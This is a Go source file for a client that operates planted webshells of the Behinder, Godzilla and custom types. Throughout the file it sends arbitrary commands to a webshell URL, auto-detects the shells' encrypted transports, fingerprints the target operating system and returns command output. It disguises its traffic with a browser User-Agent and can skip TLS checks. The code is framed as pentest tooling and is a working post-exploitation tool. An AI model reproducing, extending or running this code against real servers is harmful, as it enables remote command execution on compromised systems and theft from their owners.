package webshell

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
)

const (
	maxResponseBytes = 8 << 20 // hard cap on one shell response
	detectTimeout    = 8 * time.Second
	detectBudget     = 45 * time.Second // overall cap across all transport/payload probes
)

// Client is a persistent connection to one webshell. Cookies are kept in a jar
// (Behinder stores its session key in a PHP session), and the detected transport
// is reused for subsequent requests. Execute serializes requests per shell because
// most shells are not concurrency-safe.
type Client struct {
	cfg  Config
	http *http.Client
	jar  http.CookieJar

	mu        sync.Mutex
	transport string // "scheme|payload" after detection
	osType    string
}

func New(cfg Config) (*Client, error) {
	cfg = cfg.normalized()
	if err := cfg.Validate(); err != nil {
		return nil, err
	}
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}
	tr := &http.Transport{
		Proxy:               http.ProxyFromEnvironment,
		MaxIdleConnsPerHost: 2,
		IdleConnTimeout:     30 * time.Second,
		// TLS verification is deliberately optional: pentest targets routinely use
		// self-signed certificates. The user opts in per shell (insecure=true).
		TLSClientConfig: &tls.Config{InsecureSkipVerify: cfg.Insecure}, //nolint:gosec
	}
	return &Client{
		cfg:       cfg,
		http:      &http.Client{Timeout: time.Duration(cfg.TimeoutSeconds) * time.Second, Transport: tr, Jar: jar},
		jar:       jar,
		transport: cfg.Transport,
		osType:    cfg.OSType,
	}, nil
}

func (c *Client) Transport() string {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.transport
}

func (c *Client) OSType() string {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.osType
}

func (c *Client) Config() Config { return c.cfg }

func (c *Client) Close() {
	if tr, ok := c.http.Transport.(*http.Transport); ok {
		tr.CloseIdleConnections()
	}
}

// Execute runs one command and returns its output.
func (c *Client) Execute(ctx context.Context, cmd string) (*ExecResult, error) {
	if strings.TrimSpace(cmd) == "" {
		return nil, errors.New("命令不能为空")
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.needsTransportLocked() && c.transport == "" {
		if err := c.detectLocked(ctx); err != nil {
			return nil, err
		}
	}
	return c.executeLocked(ctx, cmd)
}

// Test probes the shell with a random marker, auto-detects the encrypted transport
// when needed, and detects the target OS. It does not persist anything itself.
func (c *Client) Test(ctx context.Context) *TestResult {
	start := time.Now()
	c.mu.Lock()
	defer c.mu.Unlock()

	token := "artex_" + md5Hex(fmt.Sprintf("%d", time.Now().UnixNano()))[:12]
	probe := func() (string, int, error) {
		if c.needsTransportLocked() && c.transport == "" {
			if err := c.detectLocked(ctx); err != nil {
				return "", 0, err
			}
		}
		res, err := c.executeLocked(ctx, "echo "+token)
		if err != nil {
			return "", 0, err
		}
		return res.Output, res.HTTPStatus, nil
	}
	out, status, err := probe()
	// A persisted transport may be stale (rotated password, another shell behind
	// the same URL). With encoding=auto, fall back to a fresh detection once.
	if err == nil && !strings.Contains(out, token) && c.transport != "" && c.cfg.Encoding == EncodingAuto {
		// Clear the persisted scheme too: keeping it would constrain detection to the
		// stale scheme and never discover a shell that now answers on another one.
		c.transport = ""
		c.cfg.Transport = ""
		out, status, err = probe()
	}
	if err != nil {
		return &TestResult{OK: false, Error: err.Error(), DurationMS: time.Since(start).Milliseconds()}
	}
	ok := strings.Contains(out, token)
	lastErr := ""
	if !ok {
		// The endpoint answered, but did not run our command: usually a wrong
		// type/parameter/password combination.
		lastErr = "目标有响应，但未执行测试命令（请检查类型/参数/密码）"
	} else {
		_ = c.detectOSLocked(ctx)
	}
	return &TestResult{
		OK:         ok,
		Output:     trimForDisplay(out),
		OSType:     c.osType,
		Transport:  c.transport,
		HTTPStatus: status,
		DurationMS: time.Since(start).Milliseconds(),
		Error:      lastErr,
	}
}

// EnsureOS detects the target OS once and caches it.
func (c *Client) EnsureOS(ctx context.Context) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.osType != "" {
		return nil
	}
	if c.needsTransportLocked() && c.transport == "" {
		if err := c.detectLocked(ctx); err != nil {
			return err
		}
	}
	return c.detectOSLocked(ctx)
}

func (c *Client) needsTransportLocked() bool {
	return c.cfg.Type == TypeBehinder || c.cfg.Type == TypeGodzilla
}

func (c *Client) detectTimeout() time.Duration {
	d := time.Duration(c.cfg.TimeoutSeconds) * time.Second
	if d > detectTimeout {
		d = detectTimeout
	}
	if d < 3*time.Second {
		d = 3 * time.Second
	}
	return d
}

// detectLocked tries transport/payload pairs until one executes the marker command.
func (c *Client) detectLocked(ctx context.Context) error {
	ctx, cancel := context.WithTimeout(ctx, detectBudget)
	defer cancel()
	token := "artex_" + md5Hex(fmt.Sprintf("%d-detect", time.Now().UnixNano()))[:12]
	want := c.cfg.Transport
	if want == "" {
		want = c.cfg.Encoding
	}
	var transports []transport
	var payloads []payloadVariant
	if c.cfg.Type == TypeBehinder {
		transports = behTransports(c.cfg.Password, want)
		payloads = behPayloads(want)
	} else {
		transports = godzillaTransports(c.cfg.Password, want)
		payloads = godzillaPayloads(want)
	}
	var lastErr error
	for _, pv := range payloads {
		for i := range transports {
			tr := &transports[i]
			actx, cancel := context.WithTimeout(ctx, c.detectTimeout())
			res, err := c.executeWithLocked(actx, "echo "+token, tr, &pv)
			cancel()
			if err != nil {
				lastErr = err
				continue
			}
			if strings.Contains(res.Output, token) {
				c.transport = tr.ID + "|" + pv.ID
				return nil
			}
			lastErr = fmt.Errorf("目标有响应但传输变体未命中")
		}
	}
	if lastErr == nil {
		lastErr = errors.New("没有可用的传输变体")
	}
	return fmt.Errorf("自动探测加密传输失败: %w（可在编辑中手动选择编码）", lastErr)
}

func (c *Client) detectOSLocked(ctx context.Context) error {
	res, err := c.executeLocked(ctx, "uname -s || ver")
	if err != nil {
		c.osType = "unknown"
		return err
	}
	c.osType = classifyOS(res.Output)
	return nil
}

// classifyOS maps uname/ver output to the command dialect used by the file
// manager. Git/MSYS/Cygwin report MINGW64_NT / MSYS_NT / CYGWIN_NT but the
// underlying host is Windows, so those must take the cmd/PowerShell branch.
func classifyOS(out string) string {
	low := strings.ToLower(out)
	switch {
	case strings.Contains(low, "windows"), strings.Contains(low, "microsoft"),
		strings.Contains(low, "mingw"), strings.Contains(low, "msys"), strings.Contains(low, "cygwin"):
		return "windows"
	case strings.Contains(low, "linux"), strings.Contains(low, "darwin"), strings.Contains(low, "bsd"), strings.Contains(low, "sunos"):
		return "linux"
	default:
		return "unknown"
	}
}

// executeLocked runs a command using the client's current transport.
func (c *Client) executeLocked(ctx context.Context, cmd string) (*ExecResult, error) {
	var tr *transport
	var pv *payloadVariant
	if c.needsTransportLocked() {
		if c.transport == "" {
			return nil, errors.New("加密传输尚未探测，请先测试连接")
		}
		parts := strings.SplitN(c.transport, "|", 2)
		var list []transport
		var plist []payloadVariant
		if c.cfg.Type == TypeBehinder {
			list = behTransports(c.cfg.Password, parts[0])
			plist = behPayloads(c.transport)
		} else {
			list = godzillaTransports(c.cfg.Password, parts[0])
			plist = godzillaPayloads(c.transport)
		}
		if len(list) > 0 {
			tr = &list[0]
		}
		if len(plist) > 0 {
			pv = &plist[0]
		}
	}
	return c.executeWithLocked(ctx, cmd, tr, pv)
}

func (c *Client) executeWithLocked(ctx context.Context, cmd string, tr *transport, pv *payloadVariant) (*ExecResult, error) {
	start := time.Now()
	payload, marked, err := buildPayload(c.cfg, cmd)
	if err != nil {
		return nil, err
	}
	requestBody := payload
	if tr != nil {
		if pv == nil {
			pv = &payloadVariant{ID: "direct", Wrap: func(s string) string { return s }}
		}
		wrapped := pv.Wrap(payload)
		enc, err := tr.Encode([]byte(wrapped))
		if err != nil {
			return nil, fmt.Errorf("加密请求失败: %w", err)
		}
		requestBody = string(enc)
	}

	status, body, truncated, err := c.post(ctx, requestBody)
	if err != nil {
		return nil, err
	}
	out := string(body)
	if tr != nil {
		if decoded, err := tr.Decode(body); err == nil && mostlyText(decoded) {
			out = string(decoded)
		}
	}
	if marked {
		startMarker, endMarker := extractMarkerNames(payload)
		if startMarker != "" {
			out = extractMarked(out, startMarker, endMarker)
		}
	}
	out = applyExtraction(c.cfg, out)
	out = strings.TrimRight(out, "\x00")
	out = stripPowerShellNoise(out)
	return &ExecResult{
		Output:      out,
		HTTPStatus:  status,
		DurationMS:  time.Since(start).Milliseconds(),
		OutputBytes: len(out),
		Truncated:   truncated,
		Transport:   c.transport,
	}, nil
}

// extractMarkerNames recovers the marker strings embedded by phpExecCode / JSP /
// ASP wrappers. They are deterministic within one payload and easy to find.
func extractMarkerNames(payload string) (string, string) {
	re := regexp.MustCompile(`(__ws_[0-9a-f]+_start__)`)
	m := re.FindStringSubmatch(payload)
	if len(m) < 2 {
		return "", ""
	}
	start := m[1]
	end := strings.Replace(start, "_start__", "_end__", 1)
	return start, end
}

func applyExtraction(cfg Config, out string) string {
	if cfg.ResponseRegex != "" {
		if re, err := compileRegex(cfg.ResponseRegex); err == nil {
			if m := re.FindStringSubmatch(out); len(m) > 1 {
				out = m[1]
			} else if len(m) == 1 {
				out = m[0]
			}
		}
	}
	if cfg.ResponseB64 {
		if b, ok := b64decodeLoose([]byte(out)); ok {
			out = string(b)
		}
	}
	return out
}

// post sends one payload and returns the HTTP status and raw body.
func (c *Client) post(ctx context.Context, payload string) (int, []byte, bool, error) {
	u, err := url.Parse(c.cfg.URL)
	if err != nil {
		return 0, nil, false, err
	}
	method := c.cfg.Method
	var body io.Reader
	if method == "GET" {
		q := u.Query()
		q.Set(c.cfg.Param, payload)
		u.RawQuery = q.Encode()
	} else if c.cfg.Type == TypeCustom && strings.TrimSpace(c.cfg.BodyTemplate) != "" {
		// Custom shells get their own request envelope. Placeholders are expanded in
		// one pass over the original template so a command containing "{{pass}}"
		// can't be interpreted as another placeholder.
		tpl := strings.NewReplacer(
			"{{cmd}}", payload,
			"{{cmd_b64}}", base64.StdEncoding.EncodeToString([]byte(payload)),
			"{{cmd_url}}", url.QueryEscape(payload),
			"{{pass}}", c.cfg.Password,
			"{{param}}", c.cfg.Param,
		).Replace(c.cfg.BodyTemplate)
		body = strings.NewReader(tpl)
	} else {
		form := url.Values{c.cfg.Param: {payload}}
		body = strings.NewReader(form.Encode())
	}

	req, err := http.NewRequestWithContext(ctx, method, u.String(), body)
	if err != nil {
		return 0, nil, false, err
	}
	for k, v := range c.cfg.Headers {
		if strings.EqualFold(k, "Host") {
			req.Host = v
			continue
		}
		req.Header.Set(k, v)
	}
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36")
	}
	if method == "POST" && req.Header.Get("Content-Type") == "" {
		ct := "application/x-www-form-urlencoded"
		if c.cfg.Type == TypeCustom {
			tpl := strings.TrimSpace(c.cfg.BodyTemplate)
			if strings.HasPrefix(tpl, "{") || strings.HasPrefix(tpl, "[") {
				ct = "application/json"
			}
		}
		req.Header.Set("Content-Type", ct)
	}
	resp, err := c.http.Do(req)
	if err != nil {
		return 0, nil, false, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(io.LimitReader(resp.Body, maxResponseBytes+1))
	if err != nil {
		return resp.StatusCode, nil, false, err
	}
	truncated := len(data) > maxResponseBytes
	if truncated {
		data = data[:maxResponseBytes]
	}
	return resp.StatusCode, data, truncated, nil
}

func trimForDisplay(s string) string {
	if len(s) > 2000 {
		return s[:2000] + "…"
	}
	return strings.TrimSpace(s)
}

// stripPowerShellNoise removes the XML progress stream PowerShell can emit on
// stderr ("#< CLIXML ... </Objs>") when a shell merges stderr into stdout, plus a
// leading UTF-8 BOM. Left in place they poison base64 file payloads.
func stripPowerShellNoise(s string) string {
	s = strings.TrimPrefix(s, "\ufeff")
	for {
		i := strings.Index(s, "#< CLIXML")
		if i < 0 {
			break
		}
		j := strings.Index(s[i:], "</Objs>")
		if j < 0 {
			s = s[:i]
			break
		}
		s = s[:i] + s[i+j+len("</Objs>"):]
	}
	return s
}
